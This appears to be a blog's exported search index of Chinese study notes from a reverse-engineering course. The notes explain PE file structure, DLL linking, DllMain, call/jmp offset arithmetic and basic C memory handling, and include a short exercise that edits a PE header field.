class="line">    <span class="keyword">int</span> section_RVA=<span class="built_in">FOAtoRVA</span>(section_FOA,FileBuffer);</span><br><span class="line"></span><br><span class="line"><span class="comment">//修改VirtualAddress</span></span><br><span class="line">    *(<span class="keyword">int</span>*)(FileBuffer+e_lfanew+<span class="number">120</span>+<span class="number">40</span>) = section_RVA;</span><br><span class="line"></span><br><span class="line"><span class="comment">//写入文件</span></span><br><span class="line">    <span class="built_in">fwrite</span>(FileBuffer,<span class="number">1</span>,size,fp_w);</span><br><span class="line">    <span class="built_in">fclose</span>(fp);</span><br><span class="line">    <span class="built_in">fclose</span>(fp_w);</span><br><span class="line">    <span class="built_in">free</span>(FileBuffer);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 2020年12月 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>[视频笔记] 滴水逆向-链接</title>
      <link href="/2020/10/27/%E6%BB%B4%E6%B0%B4%E9%80%86%E5%90%91-%E9%93%BE%E6%8E%A5/"/>
      <url>/2020/10/27/%E6%BB%B4%E6%B0%B4%E9%80%86%E5%90%91-%E9%93%BE%E6%8E%A5/</url>
      
        <content type="html"><![CDATA[<h1 id="静态链接"><a href="#静态链接" class="headerlink" title="静态链接"></a>静态链接</h1><p>生成lib文件，lib文件中存放着函数的内容。</p><p>静态链接是将程序运行所需要所有模块，在程序装载之前完成打包合并，生成可执行文件。</p><p>一旦程序需要更新，则程序需要重新链接。</p><br><h1 id="动态链接"><a href="#动态链接" class="headerlink" title="动态链接"></a>动态链接</h1><p>生成lib文件和dll文件，lib文件中存放着函数的位置，dll文件存放着函数的内容</p><p>动态链接是将程序运行的模块相互分割开来，形成独立的文件，在程序运行时，才对程序运行时所需要的模块进行链接，其本质就是将链接的过程推迟到运行时处理。</p><p>如果第三方动态库需要更新，理论上只需要将第三方库覆盖旧的，不需要重新链接所有程序，动态链接的可扩展性和兼容性会更强。</p><p>动态链接的缺点是在装载的时候进行链接，会导致性能上有一些损失，不过用这些性能损失换取空间的节省和程序构建的灵活，很值得。</p><p><strong>lib文件有两个作用，一个是静态库，一个是dll文件的导入库。</strong></p><br><h1 id="DLL程序的入口函数DllMain"><a href="#DLL程序的入口函数DllMain" class="headerlink" title="DLL程序的入口函数DllMain"></a>DLL程序的入口函数DllMain</h1><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL APIENTRY <span class="title">DllMain</span><span class="params">( HMODULE hModule,</span></span></span><br><span class="line"><span class="params"><span class="function">                       DWORD  ul_reason_for_call,</span></span></span><br><span class="line"><span class="params"><span class="function">                       LPVOID lpReserved</span></span></span><br><span class="line"><span class="params"><span class="function">                     )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>参数意义:<br>①<code>hModule</code>参数：指向DLL本身的实例句柄；</p><p>②<code>ul_reason_for_call</code>参数：指明了DLL被调用的原因，可以有以下4个取值：</p><ol><li><p>DLL_PROCESS_ATTACH：<br>当DLL被进程 &lt;&lt;第一次&gt;&gt; 调用时，导致DllMain函数被调用，同时ul_reason_for_call的值为DLL_PROCESS_ATTACH，如果同一个进程后来再次调用此DLL时，操作系统只会增加DLL的使用次数，不会再用DLL_PROCESS_ATTACH调用DLL的DllMain函数。</p></li><li><p>DLL_PROCESS_DETACH：<br>当DLL被从进程的地址空间解除映射时，系统调用了它的DllMain，传递的ul_reason_for_call值是DLL_PROCESS_DETACH。如果进程的终结是因为调用了TerminateProcess，系统就不会用DLL_PROCESS_DETACH来调用DLL的DllMain函数。这就意味着DLL在进程结束前没有机会执行任何清理工作。</p></li><li><p>DLL_THREAD_ATTACH：<br>当进程创建一线程时，系统查看当前映射到进程地址空间中的所有DLL文件映像，并用值DLL_THREAD_ATTACH调用DLL的DllMain函数。 新创建的线程负责执行这次的DLL的DllMain函数，只有当所有的DLL都处理完这一通知后，系统才允许线程开始执行它的线程函数。</p></li><li><p>DLL_THREAD_DETACH：<br>如果线程调用了ExitThread来结束线程（线程函数返回时，系统也会自动调用ExitThread），系统查看当前映射到进程空间中的所有DLL文件映像，并用DLL_THREAD_DETACH来调用DllMain函数，通知所有的DLL去执行线程级的清理工作。<br>注意：如果线程的结束是因为系统中的一个线程调用了TerminateThread，系统就不会用值DLL_THREAD_DETACH来调用所有DLL的DllMain函数。</p></li></ol><p>③<code>lpReserved</code>参数：保留，目前没什么意义。</p>]]></content>
      
      
      <categories>
          
          <category> 2020年10月 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>[视频笔记] 滴水逆向_硬编码</title>
      <link href="/2020/10/06/%E6%BB%B4%E6%B0%B4%E9%80%86%E5%90%91-%E7%A1%AC%E7%BC%96%E7%A0%81/"/>
      <url>/2020/10/06/%E6%BB%B4%E6%B0%B4%E9%80%86%E5%90%91-%E7%A1%AC%E7%BC%96%E7%A0%81/</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-硬编码"><a href="#0x00-硬编码" class="headerlink" title="0x00 硬编码"></a>0x00 硬编码</h1><table><thead><tr><th>硬编码</th><th>汇编指令</th></tr></thead><tbody><tr><td>E8</td><td>call</td></tr><tr><td>E9</td><td>jmp</td></tr><tr><td>6A</td><td>push</td></tr></tbody></table><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">004011F8E8 53 FE FF FFcall00401050</span><br><span class="line">004011FD33 C0xoreax,eax</span><br></pre></td></tr></table></figure><p>X就是E8后面的值<code>53 FE FF FF</code></p><p>公式：</p><p><strong>call（E8）后面真正要跳转的地址=E8这条指令的下一行地址+X</strong><br><strong>X=call（E8）后面真正要跳转的地址-E8这条指令的下一行地址</strong></p><p><strong>E8这条指令的下一行地址=E8当前的地址+5</strong></p><p><strong>要跳转的地方=E8当前的地址+5+X</strong><br><strong>X=要跳转的地址-(E8的地址+5)</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">X=00401050-004011FD=FFFFFE53</span><br></pre></td></tr></table></figure><p>E9也是这么计算的</p><p>如果文件偏移和内存偏移不相同，在节区中需要转换一下。</p>]]></content>
      
      
      <categories>
          
          <category> 2020年10月 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>[视频笔记] 滴水逆向_PE</title>
      <link href="/2020/09/21/%E6%BB%B4%E6%B0%B4%E9%80%86%E5%90%91-PE/"/>
      <url>/2020/09/21/%E6%BB%B4%E6%B0%B4%E9%80%86%E5%90%91-PE/</url>
      
        <content type="html"><![CDATA[<h1 id="有关C的小玩意"><a href="#有关C的小玩意" class="headerlink" title="有关C的小玩意"></a>有关C的小玩意</h1><h2 id="编译"><a href="#编译" class="headerlink" title="编译"></a>编译</h2><p>编译的过程：预处理 编译 汇编 链接</p><p>#define（什么都能替换）在预处理进行替换</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> true 1<span class="comment">//把1替换成true</span></span></span><br></pre></td></tr></table></figure><p>typedef（只能替换类型）在编译时进行替换</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">unsigned</span> <span class="keyword">char</span> BYTE;</span><br></pre></td></tr></table></figure><p>例子：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">max</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> b)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> a&gt;b?a:b;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> a = <span class="built_in">max</span>(<span class="number">1</span>,<span class="number">2</span>);</span><br><span class="line">    std::cout &lt;&lt; a;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//这两个实现的效果是一样的</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAX(A,B) ((A) &gt; (B)?(A):(B))</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> a = <span class="built_in">MAX</span>(<span class="number">1</span>,<span class="number">2</span>);</span><br><span class="line">    std::cout &lt;&lt; a;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注意：</p><ol><li>宏名标识符与左圆括号之间不允许有空白符，应紧接在一起。</li><li>宏与函数的区别：函数分配额外的堆栈空间，而宏只是替换。</li><li>为了避免出错，宏定义中给形参加上括号。</li><li>末尾不需要分号</li><li>define可以替代多行的代码，记得后面加\</li></ol><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MALLOC(n,type)\</span></span><br><span class="line"><span class="meta">((n+ty\</span></span><br><span class="line"><span class="meta">pe))</span></span><br></pre></td></tr></table></figure><h2 id="堆（分配内存）"><a href="#堆（分配内存）" class="headerlink" title="堆（分配内存）"></a>堆（分配内存）</h2><p>说这个之前要先想想之前说过的程序运行时，会把程序分成的几个区域，分为<code>代码区</code>，<code>堆栈</code>，<code>堆</code>，<code>全局变量</code>，<code>常量区</code>。</p><p>首先要明确几点：</p><ol><li>在程序运行结束之后，所有内存空间都会被释放。</li><li>全局变量在程序运行时就会一直存在，直到程序结束被释放</li><li>堆栈在函数结束的时候被释放</li><li>堆由程序员自己定义，自己释放。如果没被自己释放，程序退出时也会被释放。</li></ol><p>简单说一下堆如果不释放会有什么危害，一个服务器或者大型程序几乎是很长时间不关闭的，如果此时堆用完不被释放，内存会被以及无用的数据占满，你的内存占有率就会越来越高，这就是内存泄漏。</p><p>一次内存泄漏似乎不会有大的影响，但内存泄漏堆积后的后果就是内存溢出。</p><p>malloc函数可以在堆中分配内存。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">malloc</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">   <span class="keyword">size_t</span> size</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure><p>可以看到malloc的函数类型是void*，因为你不知道要传给你是什么类型。</p><p>例子：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//在堆中申请分配内存，分配128个int</span></span><br><span class="line"><span class="keyword">int</span>* ptr;</span><br><span class="line">ptr = (<span class="keyword">int</span>*)<span class="built_in">malloc</span>(<span class="built_in"><span class="keyword">sizeof</span></span>(<span class="keyword">int</span>)*<span class="number">128</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//要对申请的空间大小进行校验，判断是否申请成功</span></span><br><span class="line"><span class="keyword">if</span>(ptr == <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//初始化分配的内存空间</span></span><br><span class="line"><span class="comment">//memset:sets buffers to specified character.</span></span><br><span class="line"><span class="built_in">memset</span>(ptr,<span class="number">0</span>,<span class="built_in"><span class="keyword">sizeof</span></span>(<span class="keyword">int</span>)*<span class="number">128</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//使用</span></span><br><span class="line">*ptr = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//释放空间</span></span><br><span class="line"><span class="built_in">free</span>(ptr);</span><br><span class="line"></span><br><span class="line"><span class="comment">//将指针设置为NULL</span></span><br><span class="line">ptr = <span class="literal">NULL</span>;</span><br></pre></td></tr></table></figure><p>建议看<a href="https://docs.microsoft.com/en-us/cpp/c-runtime-library/reference/malloc?view=vs-2019">msdn链接</a></p><br><h1 id="分节"><a href="#分节" class="headerlink" title="分节"></a>分节</h1><p>在内存中运行的程序和在硬盘中的程序数据几乎是一样的，只有起始位置不一样（在内存中的起始位置是可以变的），一段数据，然后中间断开补上0，然后再一段数据。我们把PE的这种特征称为分节。</p><p>我们首先要明白几个概念：</p><h2 id="虚拟内存VA（简述）"><a href="#虚拟内存VA（简述）" class="headerlink" title="虚拟内存VA（简述）"></a>虚拟内存VA（简述）</h2><p>任何一个exe都有一个自己的独立的4GB内存空间，哪怕计算机的内存只有1GB，exe也有4GB。之所以是4GB，是因为32位计算机的寻址范围只有4GB。</p><p>其中低2GB给应用程序使用，高2GB给操作系统内核使用。</p><p>访问低2G的内存，写个入口函数main就可以；访问高2G的内存需要驱动。</p><h2 id="硬盘对齐和内存对齐"><a href="#硬盘对齐和内存对齐" class="headerlink" title="硬盘对齐和内存对齐"></a>硬盘对齐和内存对齐</h2><p>所有的对齐是为了增加读写的速度，找起来更快。</p><p>举个很形象的例子，假如说一本书，一页只有一个字，我们还是要给它一张纸，而不是只给它一个字的空间，这样可以增加读写的速度。</p><p>硬盘对齐：200h</p><p>内存对齐：1000h</p><p>老的编译器会进行这种操作，因为当时的硬盘空间小。</p><p><img src="https://i.loli.net/2020/09/23/XIDPWUlTSNEH9jw.png"></p><p>本来在内存中（图右）的数据在硬盘中（图左）存储会节省掉0的空间。</p><p>现在的硬盘变便宜，硬盘和内存对齐都变成一样。可以节省运算，可以用空间换时间。（由编译器决定）</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>然后小小的总结一下分节的作用：</p><ol><li>节省硬盘空间（由编译器决定，也可能用空间换时间）</li><li>一个应用程序多开（节省内存）。</li></ol><p>第二个作用是这样的。</p><p>我们可以把分节想成这样：</p><p>假设：一个程序分出不同的节，分为只读的和可读可写的节。（例如qq）</p><p><img src="https://i.loli.net/2020/09/23/jmy4qzsELw63x9N.png" alt="image-20200923192237901"></p><p>我们想上多个qq。因为只读的节不会改变，所以只需要添加可读可写的节即可。</p><p><img src="https://i.loli.net/2020/09/23/kniXOTYGPDx32vf.png" alt="image-20200923191759340"></p><br><h1 id="PE"><a href="#PE" class="headerlink" title="PE"></a>PE</h1><p>PE文件是windows系统中遵循PE结构的文件，比如以.exe .dll为后缀名的文件以及系统驱动文件。</p><p>exe,sys,dll是操作系统上可执行文件，txt，docx，xls是由exe打开的，自己是没办法运行的。例如txt是由notepad.exe执行的，docx由word运行。</p><p>PE文件大体分为两部分，头(包括DOS头，PE文件头，块表)与主体(块)。</p><h2 id="基础概念："><a href="#基础概念：" class="headerlink" title="基础概念："></a>基础概念：</h2><p><strong>虚拟地址(VA)：</strong> 在一个程序运行起来的时候，会被加载到内存中，并且每个进程都有自己的4GB，这个4GB当中的某个位置叫做<strong>虚拟地址</strong>，由物理地址映射过来的，4GB的空间，并没有全部被用到。</p><p><strong>基地址( Imagebase ):</strong>    磁盘中的文件加载到内存当中的时候可以加载到任意位置，而这个位置就是程序的<strong>基址</strong>。EXE默认的加载基址是400000h,DLL文件默认基址是10000000h。需要注意的是基地址不是程序的入口点。</p><p><strong>相对虚拟地址(RVA):<strong>为了避免PE文件中有确定的内存地址，引入了相对虚拟地址的概念。RVA是在内存中相对与载入地址（</strong>基地址</strong>）的偏移量，所以你可以发现前三个概念的关系 ： <strong>虚拟地址(VA)=  基地址+ 相对虚拟地址(RVA)</strong></p><p><strong>文件偏移地址(FOA)：</strong>当PE文件储存在某个磁盘当中的时候，某个数据的位置相对于文件头的偏移量。</p><p><strong>入口点(OEP)：</strong>首先明确一个概念就是OEP是一个RVA，,然后使用 <strong>OEP</strong> + <strong>Imagebase</strong> == <strong>入口点的VA</strong>，通常情况下，OEP指向的不是<strong>main</strong>函数。</p><p><strong>RVA转化为FOA：</strong></p><p>判断内存中的区块的对齐大小（SectionAlignment）和文件中的区块的对齐大小（FileAlignment）是否相等，如果相等，RVA=FOA；</p><p>如果不相等，但是RVA的值小于所有头的尺寸大小（SizeOfHeaders），则RVA=FOA；</p><p>如果都不可以，则判断在哪个节中，RVA减掉VirtualAddress（当前节的 RVA 地址），然后再加上PointerToRawData（当前节的FOA地址）</p><h1 id="PE头解析"><a href="#PE头解析" class="headerlink" title="PE头解析"></a>PE头解析</h1><p>DOS头跟标准PE头的大小是确定的，option PE头是不确定的。</p><p>DOS头是64位，标准PE头是20位，option PE头32位系统中是224位（E0），64位系统中是240位（F0）</p><h2 id="DOS头"><a href="#DOS头" class="headerlink" title="DOS头"></a>DOS头</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">IMAGE_DOS_HEADER STRUCT</span><br><span class="line">&#123;</span><br><span class="line">+<span class="number">0</span>h WORD    e_magic   <span class="comment">//MZ(4Dh 5Ah)     DOS可执行文件标记</span></span><br><span class="line">+<span class="number">2</span>h     WORD    e_cblp</span><br><span class="line">+<span class="number">4</span>h WORD    e_cp</span><br><span class="line">+<span class="number">6</span>h WORD    e_crlc</span><br><span class="line">+<span class="number">8</span>h WORD    e_cparhdr</span><br><span class="line">+<span class="number">0</span>ah    WORD    e_minalloc</span><br><span class="line">+<span class="number">0</span>ch    WORD    e_maxalloc</span><br><span class="line">+<span class="number">0</span>eh    WORD    e_ss</span><br><span class="line">+<span class="number">10</span>h    WORD    e_sp</span><br><span class="line">+<span class="number">12</span>h    WORD    e_csum</span><br><span class="line">+<span class="number">14</span>h    WORD    e_ip</span><br><span class="line">+<span class="number">16</span>h    WORD    e_cs</span><br><span class="line">+<span class="number">18</span>h    WORD    e_lfarlc</span><br><span class="line">+<span class="number">1</span>ah    WORD    e_ovno</span><br><span class="line">+<span class="number">1</span>ch    WORD    e_res[<span class="number">4</span>]</span><br><span class="line">+<span class="number">24</span>h    WORD    e_oemid</span><br><span class="line">+<span class="number">26</span>h    WORD    e_oeminfo</span><br><span class="line">+<span class="number">29</span>h    WORD    e_res2[<span class="number">10</span>]</span><br><span class="line">+<span class="number">3</span>ch    DWORD   e_lfanew  <span class="comment">//RVA     指向PE文件头</span></span><br><span class="line">&#125; IMAGE_DOS_HEADER ENDS</span><br></pre></td></tr></table></figure><p>DOS头是16位计算机用的，在32位计算机中有两个作用：</p><ol><li>在解析exe文件时，首先解析前两个字节看看是不是MZ</li><li>最后四个字节指向PE文件头（如果在内存中的值是E8 00 00 00，因为小端序值是E8，然后从文件开始（不是从DOS头结束），数E8个字节就是PE头的位置），DOS和PE的中间内容是编译器留的空间，可以自由发挥。</li></ol><h2 id="PE文件头"><a href="#PE文件头" class="headerlink" title="PE文件头"></a>PE文件头</h2><p><strong>IMAGE_NT_HEADERS STRUCT 结构体</strong>包含了标准PE头和可选PE头</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">IMAGE_NT_HEADERS STRUCT</span><br><span class="line">&#123;</span><br><span class="line">+<span class="number">0</span>h       DWORD    Signature<span class="comment">//50450000h(PE00)</span></span><br><span class="line">+<span class="number">4</span>h       IMAGE_FILE_HEADER    FileHeader</span><br><span class="line">+<span class="number">18</span>h      IMAGE_OPTIONAL_HEADER32   OptionalHeader</span><br><span class="line">&#125; IMAGE_NT_HEADERS ENDS</span><br></pre></td></tr></table></figure><p><strong>IMAGE_FILE_HEADER 结构体</strong></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">structIMAGE_FILE_HEADER</span><br><span class="line">&#123;</span><br><span class="line">WORD Machine;<span class="comment">//运行平台(程序运行的CPU型号，在哪个CPU上可以运行)</span></span><br><span class="line">WORD NumberOfSections;<span class="comment">//节表的个数(PE中分了几个节)</span></span><br><span class="line">DWORD TimeDataStamp;<span class="comment">//文件创建时间，是从1970年至今的秒数</span></span><br><span class="line">DWORD PointerToSymbolicTable;<span class="comment">//指向符号表的指针</span></span><br><span class="line">DWORD NumberOfSymbols;<span class="comment">//符号表的数目</span></span><br><span class="line">WORD SizeOfOptionalHeader;<span class="comment">//IMAGE_NT_HEADERS结构中OptionHeader成员的大小，对于win32平台这个值通常是0x00e0，win64是0x00f0</span></span><br><span class="line">WORD Characteristics;<span class="comment">//文件的属性值</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>IMAGE_OPTIONAL_HEADER 结构体</strong></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">typedefstruct_IMAGE_OPTIONAL_HEADER</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Standard fields.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line">+<span class="number">18</span>h    WORD    Magic;<span class="comment">// 标志字, ROM 映像（0107h）,普通可执行文件32位（010Bh）,普通可执行文件64位（020Bh）</span></span><br><span class="line">+<span class="number">1</span>Ah    BYTE    MajorLinkerVersion;<span class="comment">// 链接程序的主版本号</span></span><br><span class="line">+<span class="number">1B</span>h    BYTE    MinorLinkerVersion;<span class="comment">// 链接程序的次版本号</span></span><br><span class="line">+<span class="number">1</span>Ch    DWORD   SizeOfCode;<span class="comment">// 所有代码节的总大小，必须是FileAlignment的整数倍，编译器填写的，没用</span></span><br><span class="line">+<span class="number">20</span>h    DWORD   SizeOfInitializedData;<span class="comment">// 已初始化数据的总大小，必须是FileAlignment的整数倍，编译器填写的，没用</span></span><br><span class="line">+<span class="number">24</span>h    DWORD   SizeOfUninitializedData;<span class="comment">// 未初始化数据（没赋初始值）的总大小，必须是FileAlignment的整数倍，编译器填写的，没用</span></span><br><span class="line">+<span class="number">28</span>h    DWORD   AddressOfEntryPoint;<span class="comment">// 程序执行入口RVA（OEP）</span></span><br><span class="line">+<span class="number">2</span>Ch    DWORD   BaseOfCode;<span class="comment">// 代码的区块的起始RVA，编译器填写的，没用</span></span><br><span class="line">+<span class="number">30</span>h    DWORD   BaseOfData;<span class="comment">// 数据的区块的起始RVA，编译器填写的，没用</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// NT additional fields.    以下是属于NT结构增加的领域。</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line">+<span class="number">34</span>h    DWORD   ImageBase;<span class="comment">// 程序的首选装载地址</span></span><br><span class="line">+<span class="number">38</span>h    DWORD   SectionAlignment;<span class="comment">// 内存中的区块的对齐大小</span></span><br><span class="line">+<span class="number">3</span>Ch    DWORD   FileAlignment;<span class="comment">// 文件中的区块的对齐大小</span></span><br><span class="line">+<span class="number">40</span>h    WORD    MajorOperatingSystemVersion;<span class="comment">// 要求操作系统最低版本号的主版本号</span></span><br><span class="line">+<span class="number">42</span>h    WORD    MinorOperatingSystemVersion;<span class="comment">// 要求操作系统最低版本号的副版本号</span></span><br><span class="line">+<span class="number">44</span>h    WORD    MajorImageVersion;<span class="comment">// 可运行于操作系统的主版本号</span></span><br><span class="line">+<span class="number">46</span>h    WORD    MinorImageVersion;<span class="comment">// 可运行于操作系统的次版本号</span></span><br><span class="line">+<span class="number">48</span>h    WORD    MajorSubsystemVersion;<span class="comment">// 要求最低子系统版本的主版本号</span></span><br><span class="line">+<span class="number">4</span>Ah    WORD    MinorSubsystemVersion;<span class="comment">// 要求最低子系统版本的次版本号</span></span><br><span class="line">+<span class="number">4</span>Ch    DWORD   Win32VersionValue;<span class="comment">// 莫须有字段，不被病毒利用的话一般为0</span></span><br><span class="line">+<span class="number">50</span>h    DWORD   SizeOfImage;<span class="comment">// ImageBuffer装入内存后的总尺寸，可以比实际的尺寸大，但必须是SectionAlignment的整数倍</span></span><br><span class="line">+<span class="number">54</span>h    DWORD   SizeOfHeaders;<span class="comment">// 所有头（DOS NT） + 区块表（节表）的尺寸大小，必须是FileAlignment的整数倍</span></span><br><span class="line">+<span class="number">58</span>h    DWORD   CheckSum;<span class="comment">// ImageBuffer的校检和，一些系统文件会有要求，用来判断文件是否被修改。我们正常写的程序大部分都是0</span></span><br><span class="line">+<span class="number">5</span>Ch    WORD    Subsystem;<span class="comment">// 可执行文件期望的子系统</span></span><br><span class="line">+<span class="number">5</span>Eh    WORD    DllCharacteristics;<span class="comment">// DllMain()函数何时被调用，默认为 0</span></span><br><span class="line">+<span class="number">60</span>h    DWORD   SizeOfStackReserve;<span class="comment">// 初始化时的栈大小</span></span><br><span class="line">+<span class="number">64</span>h    DWORD   SizeOfStackCommit;<span class="comment">// 初始化时实际提交的栈大小</span></span><br><span class="line">+<span class="number">68</span>h    DWORD   SizeOfHeapReserve;<span class="comment">// 初始化时保留的堆大小</span></span><br><span class="line">+<span class="number">6</span>Ch    DWORD   SizeOfHeapCommit;<span class="comment">// 初始化时实际提交的堆大小</span></span><br><span class="line">+<span class="number">70</span>h    DWORD   LoaderFlags;<span class="comment">// 与调试有关，默认为 0</span></span><br><span class="line">+<span class="number">74</span>h    DWORD   NumberOfRvaAndSizes;<span class="comment">// 下边数据目录的项数，这个字段自Windows NT 发布以来一直是16</span></span><br><span class="line">+<span class="number">78</span>h    IMAGE_DATA_DIRECTORY DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES];<span class="comment">// 数据目录表</span></span><br><span class="line">&#125; IMAGE_OPTIONAL_HEADER32, *PIMAGE_OPTIONAL_HEADER32;</span><br></pre></td></tr></table></figure><p><strong>程序的执行入口在AddressOfEntryPoint（OEP）+ ImageBase</strong></p><p><img src="https://i.loli.net/2020/09/25/ImKsLvRAM4ey8xG.png" alt="image-20200925204629746"></p><p>ImageBuffer的内存位置由ImageBase决定。OEP有可能在代码区偏远的地方，而不一定是在代码节的开头。（如果不记得或者有疑惑建议去od和winhex看看）</p><h2 id="节表"><a href="#节表" class="headerlink" title="节表"></a>节表</h2><p>PE文件中节的属性被定义在节表中。40字节。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_SECTION_HEADER</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">       BYTE Name[IMAGE_SIZEOF_SHORT_NAME]; <span class="comment">// 节表名称,如&quot;.text&quot;</span></span><br><span class="line">       <span class="comment">//IMAGE_SIZEOF_SHORT_NAME=8</span></span><br><span 